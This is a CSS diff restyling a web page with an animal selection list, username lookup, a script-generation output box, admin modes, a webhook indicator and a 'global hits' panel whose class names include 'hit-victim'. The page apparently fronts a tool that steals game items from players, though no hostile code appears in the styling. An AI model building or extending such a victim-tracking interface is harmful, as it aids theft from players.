@@ -12,11 +12,11 @@
     --bg: #0a0a0a;
     --surface: #121212;
     --panel: #1e1e1e;
-    --border: #333;
+    --border: #2a2a2a;
     --neon: #ffffff;
     --neon-glow: 0 0 10px rgba(255,255,255,0.8);
     --text: #e0e0e0;
-    --muted: #888;
+    --muted: #666;
     --danger: #ff4444;
     --green: #00ff88;
   }
@@ -32,8 +32,7 @@
 
   body::before {
     content: '';
-    position: fixed;
-    inset: 0;
+    position: fixed; inset: 0;
     background-image:
       radial-gradient(1px 1px at 10px 10px, rgba(255,255,255,0.9), transparent),
       radial-gradient(1px 1px at 30px 20px, rgba(255,255,255,0.7), transparent),
@@ -44,74 +43,47 @@
       radial-gradient(1px 1px at 130px 20px, rgba(255,255,255,0.7), transparent),
       radial-gradient(1px 1px at 150px 40px, rgba(255,255,255,1), transparent);
     background-size: 200px 200px;
-    pointer-events: none;
-    z-index: 0;
+    pointer-events: none; z-index: 0;
     animation: float 30s infinite linear;
   }
-
-  @keyframes float {
-    from { transform: translate(0,0); }
-    to { transform: translate(100px,100px); }
-  }
+  @keyframes float { from { transform: translate(0,0); } to { transform: translate(100px,100px); } }
 
   .wrap {
-    position: relative;
-    z-index: 1;
-    max-width: 920px;
-    margin: 0 auto;
+    position: relative; z-index: 1;
+    max-width: 920px; margin: 0 auto;
     padding: 2.8rem 1.5rem 6rem;
   }
 
   header {
-    text-align: center;
-    margin-bottom: 3rem;
+    text-align: center; margin-bottom: 3rem;
     animation: fadeDown 0.55s ease both;
   }
-
   .logo-row {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 1rem;
-    margin-bottom: 0.5rem;
+    display: flex; align-items: center; justify-content: center; gap: 1rem; margin-bottom: 0.5rem;
   }
   .logo-row::before, .logo-row::after {
-    content: '';
-    flex: 1;
-    height: 1px;
-    max-width: 160px;
+    content: ''; flex: 1; height: 1px; max-width: 160px;
   }
   .logo-row::before { background: linear-gradient(to right, transparent, var(--neon)); }
-  .logo-row::after  { background: linear-gradient(to left, transparent, var(--neon)); }
-
+  .logo-row::after  { background: linear-gradient(to left,  transparent, var(--neon)); }
   h1 {
-    font-size: clamp(1.9rem, 4.5vw, 3rem);
-    font-weight: 700;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    line-height: 1;
+    font-size: clamp(1.9rem,4.5vw,3rem); font-weight: 700;
+    letter-spacing: 0.1em; text-transform: uppercase;
+    color: var(--neon); text-shadow: var(--neon-glow); line-height: 1;
   }
-
   .tagline {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    letter-spacing: 0.18em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-top: 0.4rem;
+    font-size: 0.78rem; letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--muted); margin-top: 0.4rem;
   }
 
   /* PANELS */
   .panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    overflow: hidden;
+    background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; overflow: hidden;
     margin-bottom: 1.2rem;
     animation: fadeUp 0.5s ease both;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
   }
   .panel:nth-child(1) { animation-delay: 0.05s; }
   .panel:nth-child(2) { animation-delay: 0.13s; }
@@ -120,169 +92,113 @@
   .panel:nth-child(5) { animation-delay: 0.37s; }
 
   .ph {
-    display: flex;
-    align-items: center;
-    gap: 0.6rem;
+    display: flex; align-items: center; gap: 0.6rem;
     padding: 0.75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
+    background: var(--surface); border-bottom: 1px solid var(--border);
   }
-
   .dot {
-    width: 7px; height: 7px;
-    border-radius: 50%;
-    flex-shrink: 0;
-    animation: blink 2.2s infinite;
-    box-shadow: var(--neon-glow);
+    width: 7px; height: 7px; border-radius: 50%;
+    flex-shrink: 0; animation: blink 2.2s infinite;
   }
-  .dot-cyan    { background: var(--neon); }
-  .dot-purple  { background: var(--neon); animation-delay: 0.4s; }
-  .dot-discord { background: var(--neon); animation-delay: 0.8s; }
-  .dot-green   { background: var(--green); animation-delay: 1.2s; box-shadow: 0 0 10px rgba(0,255,136,0.8); }
+  .dot-white  { background: var(--neon); box-shadow: var(--neon-glow); }
+  .dot-cyan   { background: var(--neon); box-shadow: var(--neon-glow); }
+  .dot-purple { background: var(--neon); box-shadow: var(--neon-glow); animation-delay: 0.4s; }
+  .dot-hook   { background: var(--neon); box-shadow: var(--neon-glow); animation-delay: 0.8s; }
+  .dot-green  { background: var(--green); box-shadow: 0 0 10px rgba(0,255,136,0.8); animation-delay: 1.2s; }
 
   .ph-title {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
+    font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em;
+    color: var(--neon); text-shadow: var(--neon-glow);
   }
+  .ph-actions { margin-left: auto; display: flex; gap: 0.4rem; align-items: center; }
 
   .pb { padding: 1.25rem; }
 
   .lbl {
-    display: block;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.13em;
-    color: var(--muted);
-    margin-bottom: 0.45rem;
+    display: block; font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.13em;
+    color: var(--muted); margin-bottom: 0.45rem;
   }
 
-  .search-row {
-    display: flex;
-    gap: 0.6rem;
-    margin-bottom: 0.75rem;
-  }
-
+  .search-row { display: flex; gap: 0.6rem; margin-bottom: 0.75rem; }
   .search-input {
-    flex: 1;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 0.55rem 0.85rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.82rem;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
+    flex: 1; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 7px; padding: 0.55rem 0.85rem;
+    color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.82rem;
+    outline: none; transition: border-color 0.2s, box-shadow 0.2s;
   }
-  .search-input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+  .search-input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.3); }
   .search-input::placeholder { color: var(--muted); }
 
   .btn-sm {
     padding: 0.5rem 0.9rem;
-    background: rgba(255,255,255,0.1);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    white-space: nowrap;
-    transition: background 0.2s, color 0.2s;
-    text-shadow: var(--neon-glow);
+    background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 7px; color: var(--text);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.68rem;
+    text-transform: uppercase; letter-spacing: 0.08em;
+    cursor: pointer; white-space: nowrap; transition: background 0.2s;
   }
-  .btn-sm:hover { background: rgba(255,255,255,0.2); color: var(--text); }
-  .btn-sm:disabled { opacity: 0.5; cursor: default; }
+  .btn-sm:hover { background: rgba(255,255,255,0.14); }
+  .btn-sm:disabled { opacity: 0.45; cursor: default; }
+  .btn-sm.red { color: var(--danger); border-color: rgba(255,68,68,0.3); background: rgba(255,68,68,0.07); }
+  .btn-sm.red:hover { background: rgba(255,68,68,0.15); }
 
-  .btn-sm.red {
-    color: var(--danger);
-    border-color: rgba(255,68,68,0.5);
-    background: rgba(255,68,68,0.1);
-    text-shadow: none;
-  }
-  .btn-sm.red:hover { background: rgba(255,68,68,0.2); color: var(--text); }
-
+  /* ANIMAL LIST */
   .animal-list {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    height: 240px;
-    overflow-y: auto;
-    scrollbar-width: thin;
-    scrollbar-color: var(--neon) transparent;
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; height: 240px; overflow-y: auto;
+    scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.15) transparent;
   }
   .animal-list::-webkit-scrollbar { width: 4px; }
-  .animal-list::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 4px; }
+  .animal-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }
 
   .a-item {
-    display: flex;
-    align-items: center;
-    gap: 0.65rem;
-    padding: 0.48rem 0.9rem;
-    cursor: pointer;
+    display: flex; align-items: center; gap: 0.65rem;
+    padding: 0.48rem 0.9rem; cursor: pointer;
     border-bottom: 1px solid rgba(255,255,255,0.03);
-    transition: background 0.12s;
-    user-select: none;
+    transition: background 0.12s; user-select: none;
   }
   .a-item:last-child { border-bottom: none; }
-  .a-item:hover { background: rgba(255,255,255,0.05); }
-  .a-item.on { background: rgba(255,255,255,0.1); }
+  .a-item:hover { background: rgba(255,255,255,0.04); }
+  .a-item.on { background: rgba(255,255,255,0.08); }
 
   .a-item input[type="checkbox"] {
-    -webkit-appearance: none;
-    appearance: none;
-    width: 13px; height: 13px;
-    border: 1px solid var(--neon);
-    border-radius: 3px;
-    background: var(--surface);
-    cursor: pointer;
-    flex-shrink: 0;
-    position: relative;
-    outline: none;
+    -webkit-appearance: none; appearance: none;
+    width: 13px; height: 13px; border: 1px solid rgba(255,255,255,0.3);
+    border-radius: 3px; background: var(--surface);
+    cursor: pointer; flex-shrink: 0; position: relative; outline: none;
     transition: background 0.2s, border-color 0.2s;
   }
   .a-item input[type="checkbox"]:checked {
-    background: var(--neon);
-    border-color: var(--neon);
-    box-shadow: var(--neon-glow);
+    background: var(--neon); border-color: var(--neon); box-shadow: var(--neon-glow);
   }
   .a-item input[type="checkbox"]:checked::after {
-    content: '✓';
-    position: absolute;
-    color: black;
-    font-size: 8px;
-    font-weight: bold;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -55%);
+    content: '✓'; position: absolute; color: black;
+    font-size: 8px; font-weight: bold;
+    top: 50%; left: 50%; transform: translate(-50%, -55%);
   }
 
   .a-name { font-size: 0.88rem; line-height: 1.2; flex: 1; color: var(--text); }
   .a-meta { font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: var(--muted); text-align: right; min-width: 100px; }
 
   .badge-og {
-    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
-    padding: 2px 6px; border-radius: 4px;
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 5px; border-radius: 3px;
     background: rgba(255,255,255,0.1); color: var(--neon);
-    border: 1px solid var(--neon); margin-left: 8px; cursor: default;
-    text-shadow: var(--neon-glow);
+    border: 1px solid rgba(255,255,255,0.5); margin-left: 6px;
   }
   .badge-secret {
-    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
-    padding: 2px 6px; border-radius: 4px;
-    background: rgba(255,255,255,0.05); color: var(--text);
-    border: 1px solid rgba(255,255,255,0.2); margin-left: 8px; cursor: default;
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 5px; border-radius: 3px;
+    background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.6);
+    border: 1px solid rgba(255,255,255,0.15); margin-left: 6px;
   }
   .badge-mythic {
-    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
-    padding: 2px 6px; border-radius: 4px;
-    background: rgba(180,100,255,0.15); color: #c97fff;
-    border: 1px solid rgba(180,100,255,0.4); margin-left: 8px; cursor: default;
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 5px; border-radius: 3px;
+    background: rgba(180,100,255,0.12); color: #c97fff;
+    border: 1px solid rgba(180,100,255,0.3); margin-left: 6px;
   }
 
   .meta-row { display: flex; justify-content: space-between; align-items: center; margin-top: 0.6rem; }
@@ -290,74 +206,45 @@
   .sel-count span { color: var(--neon); }
 
   .txt {
-    width: 100%;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 0.72rem 1rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.88rem;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
+    width: 100%; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 0.72rem 1rem;
+    color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.88rem;
+    outline: none; transition: border-color 0.2s, box-shadow 0.2s;
   }
-  .txt:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+  .txt:focus { border-color: rgba(255,255,255,0.4); box-shadow: 0 0 10px rgba(255,255,255,0.15); }
   .txt::placeholder { color: var(--muted); }
 
   .hint { font-family: 'Share Tech Mono', monospace; font-size: 0.67rem; color: var(--muted); margin-top: 0.4rem; }
   .error { color: var(--danger) !important; font-weight: bold; }
 
   .btn-gen {
-    display: block; width: 100%;
-    padding: 0.92rem;
-    background: var(--neon);
-    border: none; border-radius: 10px;
-    color: black;
-    font-family: 'Rajdhani', sans-serif;
-    font-size: 1.1rem; font-weight: 700;
-    letter-spacing: 0.14em; text-transform: uppercase;
-    cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: var(--neon-glow);
-    margin-bottom: 1.2rem;
+    display: block; width: 100%; padding: 0.92rem;
+    background: var(--neon); border: none; border-radius: 10px;
+    color: black; font-family: 'Rajdhani', sans-serif;
+    font-size: 1.1rem; font-weight: 700; letter-spacing: 0.14em; text-transform: uppercase;
+    cursor: pointer; transition: all 0.2s; box-shadow: var(--neon-glow); margin-bottom: 1.2rem;
   }
-  .btn-gen:hover { box-shadow: 0 0 20px rgba(255,255,255,0.7); transform: translateY(-1px); }
+  .btn-gen:hover { box-shadow: 0 0 24px rgba(255,255,255,0.6); transform: translateY(-1px); }
   .btn-gen:active { transform: none; }
 
-  .out-ph {
-    display: flex; align-items: center; gap: 0.6rem;
-    padding: 0.75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-  }
-  .out-ph-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em;
-    color: var(--neon); text-shadow: var(--neon-glow);
-  }
-
+  .out-ph { display: flex; align-items: center; gap: 0.6rem; padding: 0.75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
+  .out-ph-title { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--neon); text-shadow: var(--neon-glow); }
   .btn-copy {
-    margin-left: auto;
-    padding: 0.26rem 0.7rem;
-    background: rgba(255,255,255,0.1);
-    border: 1px solid var(--neon); border-radius: 6px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
+    margin-left: auto; padding: 0.26rem 0.7rem;
+    background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px;
+    color: var(--text); font-family: 'Share Tech Mono', monospace;
     font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.1em;
-    cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow);
+    cursor: pointer; transition: all 0.2s;
   }
-  .btn-copy:hover { background: rgba(255,255,255,0.2); }
-  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(0,255,136,0.1); }
+  .btn-copy:hover { background: rgba(255,255,255,0.14); }
+  .btn-copy.ok { color: var(--green); border-color: rgba(0,255,136,0.4); background: rgba(0,255,136,0.08); }
 
   .code-block {
-    background: var(--surface);
-    border: 1px solid var(--border); border-radius: 8px;
-    padding: 1rem 1.2rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.79rem; line-height: 1.8;
-    color: var(--text);
-    min-height: 120px; max-height: 480px;
-    overflow-y: auto; white-space: pre; overflow-x: auto;
+    background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
+    padding: 1rem 1.2rem; font-family: 'Share Tech Mono', monospace;
+    font-size: 0.79rem; line-height: 1.8; color: var(--text);
+    min-height: 120px; max-height: 480px; overflow-y: auto;
+    white-space: pre; overflow-x: auto;
     scrollbar-width: thin; scrollbar-color: var(--border) transparent;
   }
   .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
@@ -365,49 +252,41 @@
   .admin-mode-selector { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
   .admin-mode-btn {
     flex: 1; padding: 0.5rem;
-    background: rgba(255,255,255,0.1);
-    border: 1px solid var(--neon); border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
+    background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); border-radius: 7px;
+    color: rgba(255,255,255,0.6); font-family: 'Share Tech Mono', monospace;
     font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em;
-    cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow);
+    cursor: pointer; transition: all 0.2s;
   }
   .admin-mode-btn.active { background: var(--neon); color: black; border-color: var(--neon); box-shadow: var(--neon-glow); }
-  .admin-mode-btn:hover:not(.active) { background: rgba(255,255,255,0.2); }
+  .admin-mode-btn:hover:not(.active) { background: rgba(255,255,255,0.1); color: var(--text); }
 
   #customAdminInput { display: none; margin-top: 1rem; }
-
-  #customBrainrotInput {
-    display: flex; gap: 0.5rem; margin-top: 1rem;
-  }
+  #customBrainrotInput { display: flex; gap: 0.5rem; margin-top: 1rem; }
   #customBrainrotInput input {
     flex: 1; background: var(--surface); border: 1px solid var(--border);
     border-radius: 7px; padding: 0.55rem 0.85rem;
     color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; outline: none;
   }
   #customBrainrotInput button {
-    padding: 0.5rem 0.9rem; background: rgba(255,255,255,0.1);
-    border: 1px solid var(--neon); border-radius: 7px; color: var(--neon);
+    padding: 0.5rem 0.9rem; background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.2); border-radius: 7px; color: var(--text);
     font-family: 'Share Tech Mono', monospace; font-size: 0.68rem;
     text-transform: uppercase; letter-spacing: 0.08em; cursor: pointer; white-space: nowrap;
-    text-shadow: var(--neon-glow);
   }
-
   #pasteCustomListContainer { margin-top: 1rem; }
   #pasteCustomListContainer textarea {
     width: 100%; background: var(--surface); border: 1px solid var(--border);
     border-radius: 8px; padding: 0.72rem 1rem; color: var(--text);
     font-family: 'Share Tech Mono', monospace; font-size: 0.88rem;
     min-height: 100px; resize: vertical; outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
+    transition: border-color 0.2s;
   }
-  #pasteCustomListContainer textarea:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+  #pasteCustomListContainer textarea:focus { border-color: rgba(255,255,255,0.3); }
   #pasteCustomListContainer button {
     margin-top: 0.5rem; padding: 0.5rem 0.9rem;
-    background: rgba(255,255,255,0.1); border: 1px solid var(--neon);
-    border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em;
-    cursor: pointer; white-space: nowrap; text-shadow: var(--neon-glow);
+    background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 7px; color: var(--text); font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em; cursor: pointer;
   }
 
   /* username suggestions */
@@ -415,203 +294,142 @@
     position: absolute; bottom: 100%; left: 0; right: 0;
     background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
     margin-bottom: 8px; max-height: 380px; overflow-y: auto;
-    z-index: 100; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    z-index: 100; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.6);
   }
   .suggestion-item { padding: 12px 14px; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; gap: 14px; }
-  .suggestion-item:hover { background: rgba(255,255,255,0.05); }
-  .suggestion-avatar { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.05); overflow: hidden; flex-shrink: 0; border: 2px solid var(--neon); }
+  .suggestion-item:hover { background: rgba(255,255,255,0.04); }
+  .suggestion-avatar { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.05); overflow: hidden; flex-shrink: 0; border: 1px solid rgba(255,255,255,0.15); }
   .suggestion-avatar img { width: 100%; height: 100%; object-fit: cover; }
   .suggestion-info { flex: 1; min-width: 0; }
   .suggestion-username { color: var(--text); font-size: 0.95rem; font-weight: 600; }
-  .suggestion-handle { color: var(--neon); font-size: 0.82rem; font-weight: 500; text-shadow: var(--neon-glow); }
-  .suggestion-id { color: rgba(255,255,255,0.5); font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; }
+  .suggestion-handle { color: rgba(255,255,255,0.5); font-size: 0.82rem; }
+  .suggestion-id { color: var(--muted); font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; }
 
   /* ── GLOBAL HITS ── */
-  .hits-panel { border-color: var(--border); }
-
-  .hits-header {
-    display: flex; align-items: center; gap: 0.6rem;
-    padding: 0.75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
+  .hits-live-dot {
+    width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0;
+    background: var(--green); box-shadow: 0 0 8px rgba(0,255,136,0.9);
+    animation: blink 1.4s infinite;
   }
 
-  .hits-badge {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
-    padding: 2px 8px; border-radius: 20px;
-    background: rgba(255,255,255,0.07);
-    border: 1px solid rgba(255,255,255,0.2);
-    color: var(--neon);
+  .hits-count { font-family: 'Share Tech Mono', monospace; font-size: 0.65rem; color: var(--muted); }
+
+  .hits-scroll {
+    max-height: 340px; overflow-y: auto; padding: 0.75rem 1.25rem;
+    display: flex; flex-direction: column; gap: 0.55rem;
+    scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.08) transparent;
+  }
+  .hits-scroll::-webkit-scrollbar { width: 3px; }
+  .hits-scroll::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+
+  /* Hit card — matches the screenshot style */
+  .hit-card {
+    display: flex; align-items: center; gap: 0.9rem;
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 10px; padding: 0.7rem 1rem;
+    animation: fadeUp 0.25s ease both;
   }
 
-  .hits-actions { margin-left: auto; display: flex; align-items: center; gap: 0.5rem; }
-
-  .api-url-row {
-    display: flex; align-items: center; gap: 0.5rem;
-    padding: 0.65rem 1.25rem;
-    background: rgba(0,0,0,0.3);
-    border-bottom: 1px solid rgba(255,255,255,0.05);
-  }
-  .api-url-row label {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
-    text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted);
-    white-space: nowrap; flex-shrink: 0;
-  }
-  .api-url-row input {
-    flex: 1; background: transparent;
-    border: none; border-bottom: 1px solid var(--border);
-    color: var(--text); font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem; outline: none; padding: 0.1rem 0.3rem;
-    transition: border-color 0.2s;
-  }
-  .api-url-row input:focus { border-color: var(--neon); }
-  .api-url-row input::placeholder { color: var(--muted); }
-  .api-url-status {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
-    padding: 2px 7px; border-radius: 4px;
-    white-space: nowrap; flex-shrink: 0;
-  }
-  .api-url-status.ok  { color: var(--green); background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.25); }
-  .api-url-status.err { color: var(--danger); background: rgba(255,68,68,0.08); border: 1px solid rgba(255,68,68,0.25); }
-  .api-url-status.checking { color: var(--muted); background: rgba(255,255,255,0.05); border: 1px solid var(--border); }
-
-  .hits-list {
-    max-height: 400px; overflow-y: auto;
-    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
-  }
-  .hits-list::-webkit-scrollbar { width: 4px; }
-  .hits-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-
-  .hit-entry {
-    border-bottom: 1px solid rgba(255,255,255,0.04);
-    padding: 0.9rem 1.25rem;
-    animation: fadeUp 0.3s ease both;
-  }
-  .hit-entry:last-child { border-bottom: none; }
-
-  .hit-entry-header {
-    display: flex; align-items: center; gap: 0.7rem;
-    margin-bottom: 0.6rem;
+  .hit-icon {
+    width: 46px; height: 46px; border-radius: 8px; flex-shrink: 0;
+    background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.4rem;
   }
 
-  .hit-victim {
-    font-size: 1rem; font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.05em;
+  .hit-body { flex: 1; min-width: 0; }
+  .hit-name-row { display: flex; align-items: center; gap: 0.4rem; margin-bottom: 0.15rem; flex-wrap: wrap; }
+  .hit-name {
+    font-size: 0.95rem; font-weight: 700; color: var(--neon);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
   }
-
-  .hit-total-mps {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
-    color: var(--green);
-    text-shadow: 0 0 8px rgba(0,255,136,0.5);
-    padding: 2px 8px;
-    border: 1px solid rgba(0,255,136,0.3);
-    border-radius: 4px;
-    background: rgba(0,255,136,0.06);
+  .hit-badge-secret {
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em;
+    padding: 2px 6px; border-radius: 3px;
+    background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.55);
+    border: 1px solid rgba(255,255,255,0.15); flex-shrink: 0;
   }
-
-  .hit-time {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.62rem;
-    color: var(--muted); margin-left: auto;
+  .hit-badge-og {
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em;
+    padding: 2px 6px; border-radius: 3px;
+    background: rgba(255,255,255,0.08); color: var(--neon);
+    border: 1px solid rgba(255,255,255,0.4); flex-shrink: 0;
   }
-
-  .hit-brainrots { display: flex; flex-wrap: wrap; gap: 0.3rem; }
-
-  .hit-tag {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
-    padding: 2px 7px; border-radius: 4px;
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.1);
-    color: var(--text);
-    display: flex; align-items: center; gap: 4px;
+  .hit-badge-mythic {
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em;
+    padding: 2px 6px; border-radius: 3px;
+    background: rgba(180,100,255,0.12); color: #c97fff;
+    border: 1px solid rgba(180,100,255,0.3); flex-shrink: 0;
   }
-  .hit-tag.tag-og { background: rgba(255,255,255,0.07); border-color: rgba(255,255,255,0.35); color: var(--neon); }
-  .hit-tag.tag-mythic { background: rgba(180,100,255,0.08); border-color: rgba(180,100,255,0.3); color: #c97fff; }
-  .hit-tag .tag-mps { color: var(--muted); font-size: 0.6rem; }
+  .hit-sub { font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: var(--muted); }
+  .hit-sub span { color: rgba(255,255,255,0.45); }
+
+  .hit-mps {
+    font-family: 'Share Tech Mono', monospace; font-size: 1rem; font-weight: 700;
+    color: var(--neon); text-shadow: var(--neon-glow); white-space: nowrap; flex-shrink: 0;
+  }
 
   .hits-empty {
-    padding: 2.5rem 1.25rem; text-align: center;
+    text-align: center; padding: 2.2rem 1rem;
     font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
-    color: var(--muted); letter-spacing: 0.06em; line-height: 1.8;
+    color: var(--muted); letter-spacing: 0.06em; line-height: 2;
   }
-  .hits-empty-icon { font-size: 1.8rem; margin-bottom: 0.5rem; opacity: 0.35; }
 
-  .auto-refresh-row {
+  .auto-refresh-bar {
     display: flex; align-items: center; gap: 0.6rem;
-    padding: 0.55rem 1.25rem;
-    background: rgba(0,0,0,0.2);
-    border-top: 1px solid rgba(255,255,255,0.04);
-    font-family: 'Share Tech Mono', monospace; font-size: 0.63rem; color: var(--muted);
+    padding: 0.5rem 1.25rem;
+    background: rgba(0,0,0,0.25); border-top: 1px solid rgba(255,255,255,0.04);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: var(--muted);
   }
-  .auto-refresh-toggle {
+  .toggle {
     -webkit-appearance: none; appearance: none;
     width: 28px; height: 15px; border-radius: 10px;
-    background: var(--border); cursor: pointer; position: relative; transition: background 0.2s;
-    flex-shrink: 0;
+    background: rgba(255,255,255,0.1); cursor: pointer; position: relative; transition: background 0.2s;
   }
-  .auto-refresh-toggle:checked { background: var(--neon); }
-  .auto-refresh-toggle::after {
+  .toggle:checked { background: var(--neon); }
+  .toggle::after {
     content: ''; position: absolute;
     width: 11px; height: 11px; border-radius: 50%;
     background: white; top: 2px; left: 2px; transition: left 0.2s;
   }
-  .auto-refresh-toggle:checked::after { left: 15px; }
+  .toggle:checked::after { left: 15px; }
 
   .spin { display: inline-block; animation: spin 0.8s linear infinite; }
   @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-  @keyframes fadeDown {
-    from { opacity: 0; transform: translateY(-16px); }
-    to { opacity: 1; transform: none; }
-  }
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px); }
-    to { opacity: 1; transform: none; }
-  }
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.3; }
